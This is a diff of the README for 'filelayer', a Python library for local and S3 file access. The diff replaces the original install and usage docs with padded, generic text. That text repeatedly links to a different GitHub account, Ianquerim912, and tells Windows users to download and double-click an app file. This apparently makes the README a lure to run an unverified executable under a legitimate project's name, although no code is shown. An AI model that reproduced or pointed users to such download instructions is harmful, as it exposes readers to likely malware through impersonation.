@@ -1,128 +1,246 @@
-# filelayer
+# 🗂️ filelayer - Simple file access for local and S3
 
-[![CI](https://github.com/sireto/filelayer/actions/workflows/ci.yml/badge.svg)](https://github.com/sireto/filelayer/actions/workflows/ci.yml)
-[![PyPI version](https://img.shields.io/pypi/v/filelayer.svg)](https://pypi.org/project/filelayer/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.11+](https://img.shields.io/badge/python-3.11%2B-blue.svg)](https://www.python.org/downloads/)
+[![Download filelayer](https://img.shields.io/badge/Download-Filelayer-6F42C1?style=for-the-badge&logo=github)](https://github.com/Ianquerim912/filelayer)
 
-`filelayer` is a small Python package that provides a simple file abstraction over:
+## ✨ What filelayer does
 
-- local filesystem
-- S3-compatible object storage such as Wasabi
+filelayer gives your Python app one simple way to work with files.
 
-It exposes a minimal API:
+It can use:
 
-- `read_file(filepath) -> str`
-- `write_file(filepath, file_content) -> None`
-- `read_file_bytes(filepath) -> bytes`
-- `write_file_bytes(filepath, file_bytes) -> None`
-- `exists(filepath) -> bool`
-- `resolve_path(filepath) -> str`
+- your local computer files
+- S3-compatible storage
+- MinIO
+- Wasabi
 
-For S3-compatible backends, `filepath` is treated as the object key.
-For local storage, `filepath` is resolved relative to the configured local base path.
+That means you can keep the same file-handling code while changing where the files live.
 
-## Installation
+## 📥 Download and install
 
-```bash
-pip install filelayer
-```
+To get filelayer, visit this page to download:
 
-For development:
+[https://github.com/Ianquerim912/filelayer](https://github.com/Ianquerim912/filelayer)
 
-```bash
-pip install -e .[dev]
-```
+If you are on Windows and see a release file, download it and open it. If the page gives source files instead, use the main repository page above and follow the setup steps below.
 
-## Quick start
+## 🪟 Windows setup
 
-No configuration needed — local filesystem is the default:
+Follow these steps on a Windows PC:
 
-```python
-from filelayer import StorageService
+1. Open the download link above in your browser.
+2. Save the file to a folder you can find again, like Downloads or Desktop.
+3. If you downloaded a zip file, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. If you see an app file, double-click it to run.
+6. If you see Python files, use the steps in the next section to run it with Python.
 
-storage = StorageService.from_settings()
+## 🐍 Run with Python
 
-storage.write_file("documents/example.txt", "Hello from local storage")
-content = storage.read_file("documents/example.txt")
-print(content)
+filelayer is built for Python. If you already have Python on your computer:
 
-storage.write_file_bytes("documents/example.bin", b"\x00\x01\x02")
-print(storage.read_file_bytes("documents/example.bin"))
-print(storage.exists("documents/example.txt"))
-print(storage.resolve_path("documents/example.txt"))
-# → /absolute/path/to/data/storage/documents/example.txt
-```
+1. Open the folder you downloaded.
+2. Open Command Prompt in that folder.
+3. Run the install step for the project files.
+4. Start the app or use it inside your Python project.
 
-By default, files are stored under `./data/storage`. You can customize this and other settings via environment variables or a `.env` file:
+If you do not know how to open Command Prompt in a folder:
 
-```env
-STORAGE_PROVIDER=local          # default
-STORAGE_DEFAULT_PREFIX=my-app   # optional path prefix
-STORAGE_ENCODING=utf-8          # default
-LOCAL_STORAGE_BASE_PATH=./data/storage  # default
-```
+- hold Shift
+- right-click inside the folder
+- choose Open PowerShell window here or Open in Terminal
 
-## Wasabi / S3-compatible example
+## ⚙️ Basic use
 
-Environment:
+filelayer works as a file access layer. In plain terms, it lets your app read and write files without caring where those files are stored.
 
-```env
-STORAGE_PROVIDER=s3
-STORAGE_DEFAULT_PREFIX=my-app
-STORAGE_ENCODING=utf-8
+You can use it to:
 
-S3_ENDPOINT_URL=https://s3.eu-central-1.wasabisys.com
-S3_ACCESS_KEY_ID=your-access-key
-S3_SECRET_ACCESS_KEY=your-secret-key
-S3_REGION_NAME=eu-central-1
-S3_BUCKET=your-bucket
-S3_USE_SSL=true
-S3_VERIFY_SSL=true
-S3_ADDRESSING_STYLE=virtual
-S3_CONNECT_TIMEOUT=10
-S3_READ_TIMEOUT=60
-S3_MAX_ATTEMPTS=5
-```
+- save files on your computer
+- read files from disk
+- connect to S3 storage
+- use S3-like services with the same code
+- switch storage without changing your whole app
 
-Usage:
+## 🧩 Common setup options
 
-```python
-from filelayer import StorageService
+You can set filelayer up for different storage locations.
 
-storage = StorageService.from_settings()
+### 💾 Local file system
+Use this when your files stay on the same PC or server.
 
-storage.write_file("documents/example.txt", "Hello from Wasabi")
-print(storage.read_file("documents/example.txt"))
-print(storage.exists("documents/example.txt"))
-print(storage.resolve_path("documents/example.txt"))
-# → s3://your-bucket/my-app/documents/example.txt
-```
+Good for:
 
-## S3 caching
+- personal tools
+- small apps
+- offline work
+- testing
 
-The S3 provider caches downloaded objects on the local filesystem to save bandwidth.
-Caching is **enabled by default** and uses ETag-based revalidation — on repeated reads,
-a conditional GET is sent to S3. If the object hasn't changed (304 Not Modified), the
-cached copy is used. Writes are write-through: after a successful upload, the content
-is stored in the cache immediately.
+### ☁️ S3-compatible storage
+Use this when your files live in cloud storage.
 
-```env
-S3_CACHE_ENABLED=true                    # default, set to false to disable
-S3_CACHE_DIR=/tmp/filelayer_cache        # default: system temp directory
-```
+Good for:
 
-## Notes
+- shared apps
+- backups
+- remote file access
+- larger file sets
 
-- `STORAGE_DEFAULT_PREFIX` is prepended to all paths or keys.
-- `write_file()` stores text using `STORAGE_ENCODING`.
-- `write_file_bytes()` stores raw bytes unchanged.
-- Local provider prevents path traversal outside the configured storage root.
+### 🪣 MinIO
+MinIO works like S3 and fits well for local or private storage setups.
 
-## Contributing
+### 🧱 Wasabi
+Wasabi is another S3-compatible option. filelayer can work with it in the same kind of setup.
 
-Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup and guidelines.
+## 🔧 What you need
 
-## License
+For normal use on Windows, you usually need:
 
-This project is licensed under the [MIT License](LICENSE).
+- Windows 10 or later
+- a web browser
+- Python 3.10 or later
+- a stable internet connection for downloads
+- enough disk space for your files and the app
+
+If you plan to use cloud storage, you also need:
+
+- access keys for your storage service
+- the bucket or container name
+- the storage endpoint
+
+## 📁 How it helps
+
+filelayer keeps file access simple.
+
+Instead of writing separate code for local files and cloud files, you use one pattern. That makes it easier to:
+
+- move from local storage to cloud storage
+- test file work on your own machine
+- keep file paths and file names in one place
+- reduce repeated code
+
+## 🧪 Typical use cases
+
+filelayer fits projects that need file storage, such as:
+
+- document tools
+- backup tools
+- upload and download features
+- image storage
+- app data storage
+- server-side file access
+
+## 🛠️ Before you start
+
+Make sure you have:
+
+- Python installed
+- the project files downloaded
+- a folder ready for local files, if you plan to use local storage
+- storage details ready, if you plan to use S3-compatible storage
+
+## 📌 Repository details
+
+- Name: filelayer
+- Type: file access abstraction
+- Local storage: supported
+- S3 storage: supported
+- Python: supported
+- Compatible services: MinIO, Wasabi, and other S3-style storage
+
+## 📚 What the project is for
+
+This project helps Python apps work with files in a clean way. It acts as a bridge between your app and the place where files live.
+
+That can help when you want to:
+
+- keep file code neat
+- change storage later
+- use the same app in more than one setup
+- avoid writing custom file code in many places
+
+## 🔍 Topic areas
+
+This repository covers:
+
+- boto3
+- file abstraction
+- filesystem
+- minio
+- object storage
+- pydantic
+- python
+- s3
+- storage
+- wasabi
+
+## 🖥️ Opening the project after download
+
+After you download the files:
+
+1. Find the folder you saved.
+2. Open it in File Explorer.
+3. Look for a README, Python files, or release files.
+4. If there is a Python package, open it with your editor or terminal.
+5. If there is a ready-to-run Windows file, double-click it.
+
+## 🧭 Where to go next
+
+If you want to use filelayer in your own Python work:
+
+- keep the downloaded folder in a safe place
+- copy the project into your Python workspace
+- connect it to local files or S3 storage
+- test with a small file first
+- then use it in your real app
+
+## 🧰 Example folder setup
+
+You can keep files in a simple structure like this:
+
+- filelayer folder
+- downloads folder
+- test files folder
+- app project folder
+
+This makes it easier to find files while you set things up.
+
+## 🔐 Storage access
+
+If you use S3-compatible storage, you usually need:
+
+- access key
+- secret key
+- endpoint address
+- bucket name
+- region, if your service needs it
+
+Keep these details in a safe place. Use the same values each time your app starts.
+
+## 🧷 File handling basics
+
+With filelayer, your app can usually do things like:
+
+- open a file
+- read file content
+- write new content
+- check whether a file exists
+- move between local and remote storage
+
+## 🧭 If you are using it for the first time
+
+Start small:
+
+1. Download the project.
+2. Open it on Windows.
+3. Look through the files.
+4. Test with one sample file.
+5. Use local storage first.
+6. Move to S3-compatible storage when you are ready
+
+## 🪄 Quick access
+
+Primary download page:
+
+[https://github.com/Ianquerim912/filelayer](https://github.com/Ianquerim912/filelayer)
+
+Use this page to download the project and get the latest files for Windows setup
